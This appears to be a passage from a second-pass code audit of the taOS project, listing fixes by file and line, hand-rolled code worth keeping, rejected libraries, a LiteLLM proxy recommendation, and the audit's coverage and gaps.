| Existence oracle | `routes/projects.py:214,237,254,301,391,425` use `require_owner_or_admin` (403) where `_get_owned_project` (404) is used elsewhere | A member learns whether a project id exists (A SA5). |
| `maxsize` on the broker queue; drop empty subscriber keys | `projects/events.py:30,37-41` | R2-5 stop-gap. |
| Emit `id:`; wire `onopen`/`onerror` | `routes/projects.py:1587`; `useBoardLive.ts:16` | R2-5 stop-gap. |

### 4.4 Ingest and library nits (card Q2-4)

| Fix | Where | Why |
|---|---|---|
| Avoid the 100 MB `str` copy in `TextProcessor` | `library_pipeline.py:140-193` | Reads the whole file twice. |
| Title regex after the DOM parse; unescape | `library_pipeline.py:552-562`, `knowledge_ingest.py:319` | Titles keep `&amp;`. |
| JPEG conversion for `LA`/`PA`/`I;16` | `library_pipeline.py:296-301` | Pillow raises on those modes. |
| `--dump-single-json` | `youtube.py:151`, `x.py:57` | R2-15 (lands with that card). |
| Per-subprocess timeout | `knowledge_ingest._download:240` | R2-15. |
| Exception chaining | `x.py:293-294` | `raise … from e`. |
| Check `payload` is a dict | `agent_registry_store.py:398` | Non-dict payload raises later with no context. |

### 4.5 Skills and registry (card Q2-5)

| Fix | Where | Why |
|---|---|---|
| Drop write-never columns; delete the inert select | `skills.py:14,18,893` | Dead schema. |
| Seeded ids vs `SKILL_IMPLEMENTATIONS` test | `skills.py` | Catches drift between the seed list and the implementations. |
| Validate `skill_id` | `routes/skills.py:41-44`, `skills.py:874-880` | S2-25. |
| Revoke through the transition guard | `agent_registry_store.py:959-978` | Bypasses the state machine every other transition uses. |
| Map the handle collision to 409 | `agent_registry_store.py:937-939` | Raw `IntegrityError` surfaces as 500. |

### 4.6 `app.py` and middleware (card Q2-6)

| Fix | Where | Why |
|---|---|---|
| Fix the middleware-order comment; move GZip inside the CSRF cookie layer | `app.py:1639` | Comment is backwards; GZip outermost compresses responses that set the CSRF cookie (BREACH precondition — not demonstrated). |
| `"/setup/"` prefix | `app.py:124` | `"/setup"` also matches `/setupfoo`. |
| `gui()` fallback | `app.py:1950-1955` | Falls through to a 500 when the SPA bundle is missing. |
| `Referrer-Policy`, `Permissions-Policy`, drop `Server` | `middleware/security_headers.py:67-74`, uvicorn config | S2-31, S2-32. |
| Plain 400 for `/manifest` | `routes/manifest.py:27` | S2-33. |

### 4.7 Proxy and runtime (card Q2-7)

| Fix | Where | Why |
|---|---|---|
| Evict from the registry | `otel/span_store.py:212-219` | Grows for the process lifetime. |
| Make `undeploy` do what its docstring says | `deployer.py:741-758` | Says the trace dir is removed; it is not. |
| WAL + `busy_timeout` | `browser_sessions.py:84-96` | Maintenance-only pragmas missing. |

### 4.8 Catalog and build (card Q2-8)

| Fix | Where | Why |
|---|---|---|
| `version:` on hailo-ollama; add hailo to the audit | `app-catalog/services/hailo-ollama/manifest.yaml`; `scripts/audit-manifests.py:26-33` | Manifest dropped → 500 (PROVEN). |
| Reject unknown install methods at authoring | `store_install.py:570-703` | `npm`/`source`/`apt` are marked installed without running. |
| `AppRegistry.get_manifest` does not exist | `mcp/supervisor.py:224-238` | 47 of 47 plugin start commands resolve to None (PROVEN). |
| openclaw manifest points at a stub | `app-catalog/agents/openclaw/manifest.yaml:16` | Install does nothing. |
| Pin image digests | 27 Docker images, 0 digests, 21 floating tags; hermes pip unpinned; agent-zero mutable tag | Reproducibility; supply chain. |
| Escape `]]>` in CDATA | `mac/build/sparkle_sign.sh:52-58` | Malformed appcast on a release note containing it. |
| Manifest drift | 9 models without a licence, duplicate id `ltx-video`, 41 `hardware_tiers` keys, 11 `health_check` and `catalog.yaml` with no consumer | Dead fields mislead authors. |
| Branding drift | `site/public/index.html`, `site/docs/mkdocs.yml:18-22`, `landing/index.html` still say the old project name and domain | Product name is taOS. |
| Fail loudly without `ed_public.pem` | `mac/build/assemble_bundle.sh:32-37` | Silently disables Sparkle (S2-23). |
| `host.docker.internal` on Linux | `services/perplexica/manifest.yaml:22`, `services/open-webui/manifest.yaml:22`; `docker_installer.py:99-160` has no `extra_hosts` | Unresolvable on Docker Engine; the service cannot reach the host. |

## 5. KEEP — custom code that is correctly hand-rolled

**Slice A.** `routes/projects.py:561-704` dual-auth core (session or agent token, owner-scoped);
the `IdempotencyCache` protocol (fix R2-6, keep the design); `AgentBudgetStore` cross-process
design; `_require_lease_access` `:1174-1200`; the pairing state machine; lease lock discipline;
parameterised SQL throughout; `_TaskRequestModelMixin`.

**Slice B.** `agent_registry_store.py` overall (state machine, canonical ids); skills seeding and
`_remove_orphan_skills`; `WebProcessor._fetch:489-533` (the one fetcher with a byte cap and a
content-type gate — the model for S2-19); `_read_lora_proxy_url`; `HeavyDownloadProcessor`;
`run_pipeline:951-970`; `search_fts` quoting; `list_items` `json_each`; `x.py:326-338` allowlist;
`_CacheAwareStaticFiles`; backends dedupe; `_StartupGuardMiddleware`; `github.py` fetcher shape
(fix R2-14); the reddit `.json` approach (no PRAW).

**Slice C.** `_cap_context_snapshot`; `generate_litellm_config`; `litellm_keystore`;
`litellm_auth` allowlist and budget logic (fix S2-26 only); expert agents; `opencode_runtime`'s
`asyncio.timeout`; `deployer.deploy_agent` (`:549` key guard, `:561` `NamedTemporaryFile`);
`libtorrent` use (2.1.1 BSD, aarch64 wheel verified); receiver loopback check `:170`;
`_safe_slug` (use it in S2-9); trace-store bucket/seal design; `reap_idle`.

**Slice D.** Model manifest variants (143 https, 142 sha256); moltis/picoclaw install scripts
(SHA-pinned — the model for S2-22); `build_python.sh` / `fetch_container_cli.sh`; `App.swift` env
handling; the `SparkleBridge` `canImport` gate itself (the missing fetch is the defect);
`check_dependency_audit_ignores.py`'s cannot-see handling; `security.yml` scope; declared
GPL/AGPL catalogue services pulled at install; landing and docs sites with zero third-party JS;
`{secret_key}` provisioning in `docker_installer.py`.

**Security slices.** `routes/settings.py:29-46` `_require_admin_or_local_token` (the pattern
tsk-pjvwpa should copy); `routes/auth.py` user CRUD gates `:1255-1331`; `update_profile`
field restriction; `routes/peer.py:141-155` router-level bearer; `desktop_browser/ssrf.py` (the
guard to keep); `userspace/package.py:24-27,132-143` archive pre-check (the pattern for S7);
`desktop_rebuild.py:169` `filter="data"`; `routes/auth.py:96` login limiter; `cookie_store.py:17-23`
key validation before the `PRAGMA key` interpolation; `MermaidBlock.tsx:54` `securityLevel: "strict"`.

## 6. Rejected libraries, and why

| Library | Reason |
|---|---|
| `slowapi`, `fastapi-limiter` | Redis-backed or decorator-bound; `limits` alone covers S5/R2-35 if a library is wanted at all. |
| `cachetools`, `python-idempotency` | R2-6 is a six-line bug in a correct protocol. |
| `aiosqlite` for the budget store | The cross-process design is the point; `to_thread` suffices. |
| `jsonschema` for S2-18 | Pydantic is already the validation layer. |
| `sse-starlette` for `os_events.py` | That broker deliberately emits no `id:`; only the projects broker (R2-5) benefits. |
| `langchain-text-splitters`, `semantic-text-splitter` | 100+ MB of deps or a Rust build for a 20-line chunker (R2-26). |
| `python-magic`, `filetype` | libmagic is a system dep; `mimetypes` is already imported (R2-27). |
| `beautifulsoup4`, `selectolax`, `html2text` | `readability-lxml` + `lxml` are already core (R2-13). |
| `praw`, `asyncpraw` | OAuth app registration for read-only `.json` fetches. |
| `tenacity` for GitHub rate limits | One `Retry-After` check. |
| `PyJWT`, any ORM | Out of scope for the defects found; the sqlite stores are correct. |
| `yt-dlp` as a core dep | 3 MB, monthly releases, needs ffmpeg; keep optional with a named error (R2-15). |
| `psutil` | Only needed to replace `lsof`; one flag fixes R2-11. |
| `opentelemetry-proto` / `-sdk` | The trace store is intentionally minimal; the format is internal. |
| `aiofiles` | `to_thread` for the few sync file reads. |
| `filelock` / `portalocker` for the restart flag | Atomic rename is enough (R2-30); `filelock` is already core for R2-28. |
| Off-the-shelf OpenAI-compatible routers | See §7 — translation for `anthropic` and `ollama_chat` is the non-trivial part. |
| `prisma` | Delete (R2-18). |

## 7. The LiteLLM proxy decision

**What taOS actually uses** (report-C, verified by reading every caller): `/v1/chat/completions`,
`/v1/embeddings`, `/v1/models`, `/health` (+ `/readiness`); `/key/*` only in Postgres mode (never
run); `custom_auth` + a `CustomLogger` for `response_cost` (`litellm_callback.py:109`); router
simple-shuffle with retries and fallbacks (`litellm_config.py:409-414`); provider translation only
for `anthropic` and `ollama_chat` (`providers/__init__.py:60-95`); one in-process import at
`agent_tools/coding_model.py:137`.

**Verified facts.** `litellm` 1.99.0 MIT (2026-09-01), compiled wheels only since 1.93
(`manylinux_2_28_aarch64`, cp310-abi3); the inlined `[proxy]` list (#2804) is 31 permissive pins;
`litellm-enterprise` excluded; `litellm-proxy-extras` 0.4.93 MIT; `psutil` 7.2.2 BSD-3; `libtorrent`
2.1.1 BSD with an aarch64 wheel. Proxy-only venv cost ≈165 MB, of which `litellm` itself is 56 MB
of a 492 MB venv. Measured on an x86 development box, **not on a Pi**: full proxy 39.7 s to ready
and 281 MB RSS; a bare FastAPI passthrough 1.0 s and 56 MB.

**Options.** (a) keep the #2804 inlined list in the main venv — zero work, main venv carries
~165 MB of proxy-only packages and every `uv sync` resolves them; (b) an isolated proxy venv under
`data_dir` built from the same list, reusing `llm_proxy._selfheal_proxy_extra` (`:200-348`) — main
venv shrinks, proxy upgrades decouple from taOS releases, behaviour unchanged; (c) a thin
passthrough router — re-implements streaming, the two provider translations and the cost tables;
high risk, and the Pi-side win (RSS) is unmeasured.

**Recommendation: (b).** Keep LiteLLM, run it from an isolated venv under `data_dir`, delete the
prisma/Postgres path regardless (R2-18), fix the `/tmp` config location (S2-10) and the trace
URL (R2-3) in the same change. Revisit (c) only as an opt-in `litellm_backend: "lite"` after RSS
is measured on the reference Pi.

## 8. Coverage — and what was not reached

### Read fully

| Slice | Files read fully (LOC) | Verified by execution |
|---|---|---|
| A | `routes/cluster.py`, `cluster/manager.py`, `routes/agents.py`, `routes/projects.py` + `projects/events.py` (6 244) | Broker overflow, idempotency 503, `direction` 500, `_is_exempt`, `_ever_seen` ordering, drain-reason flow |
| B | `library_pipeline.py` (995), `knowledge_ingest.py` (397), `knowledge_store.py` (508), `knowledge_monitor.py` (185), `knowledge_categories.py` (129), `knowledge_fetchers/github.py` (400), `reddit.py` (369), `x.py` (372), `youtube.py` (non-VTT), `skills.py` (917), `agent_registry_store.py` (1 158), `app.py` (1 957) | `pypdf` absence, FTS5 duplicates, regex break, source-type spoof, `Bearer None`, recursion, `edited` timestamp, data-dir mismatch |
| C | 17 files, 6 431 LOC across `llm_proxy.py`, `litellm_*`, `trace_store.py`, `otel/*`, `deployer.py`, `torrent_downloader.py`, `download_manager.py`, `update_runner.py`, `restart_orchestrator.py`, `opencode_runtime.py`, `browser_sessions.py` | Trace-dir escape, `/tmp` modes, `lsof` client kill, trace URL on port 7117, connection/thread leak, venv/RSS measurements |
| D | `app-catalog/**` manifests and scripts, `mac/build/*`, `mac/appcast`, `security/`, `site/docs/mkdocs.yml`, `benchmarks/*.py`, `store_install.py`, `docker_installer.py`, `registry.py`, `mcp/supervisor.py` | Benchmarks import failure, streaming tier count 0, port-string crash, hailo manifest drop, 47/47 `get_manifest` None |
| inject | Whole-tree grep for sinks, then every hit read in context; three SSRF guards executed with stubbed DNS | S2-1, S2-7 |
| auth | Every route module enumerated for auth references; throwaway instance with admin + member | S2-2 … S2-5, S2-13, S2-14 (reads) |
| live | Dev host external surface: headers, cookies, limiter, unauth paths, JWT integrity | S2-15, S2-31, S2-32, positive controls |

### Skimmed or grep-only

`routes/project_canvas.py` (same broker pattern as R2-5 at `:395,:424` — not read), `youtube.py`
VTT parsing, `app.py` lifespan body `:537-1500`, `desktop_browser/ssrf.py` internals beyond the
CGNAT block, `cluster/worker_auth.py` beyond its contract.

### Not reached — for pass 3

| Area | Why it matters |
|---|---|
| `routes/project_invites.py`, `routes/project_files.py`, `routes/project_canvas.py` | Same dual-auth and broker patterns as slice A; canvas has a second unbounded broker. |
| `agent_deploy.py`, `agent_archive.py`, `agent_import.py`, `lifecycle.py` | Import path of S2-18 continues here; ownership checks unverified. |
| `library_store.py`, `library_collections.py`, `routes/librarian.py` | Likely the same FTS5 and column-interpolation patterns as R2-7 and §4.1. |
| `routes/lora_studio.py`, taosmd hand-off | Never audited. |
| The other 12 SSE producers | Only two brokers have been read; the `id:`/bounding contract is unknown for the rest. |
| `projects/beads_bridge.py`, `cluster/optimiser.py`, `capabilities.py`, `model_archive.py` | Not opened. |
| `otel/emitter.py`, `containers/*` | Pass-1 R11 twin; container runtime untouched in both passes. |
| rkllama / Hailo OpenAI-compat surfaces | Assumed compatible with LiteLLM's `openai` provider; unverified. |
| Proxy RSS and startup on the reference Pi | §7's numbers are from an x86 box. |
| `pypdf` on a real host | R2-2 verified absence only; the extraction path was never run. |
| `/v1` (`routes/agent_model_api.py`) owner check | Decides whether S2-13 is cross-user access or only a mint bug. |
| `taos.app` ownership, Sparkle latest version, `install-server.sh` internals | S2-23 prerequisites. |
| `site/public/style.css`, oracle JSON contents, LongMemEval licence | §2 unverified row. |
| Full ASGI app stood up for slices A–D | Slices A–D proved predicates in isolation; only the auth slice ran the real app. |

Explicitly out of scope, as in pass 1: the desktop SPA beyond the three files cited, the `taosmd`
repo, and any host other than the dev deployment probed by the live slice.
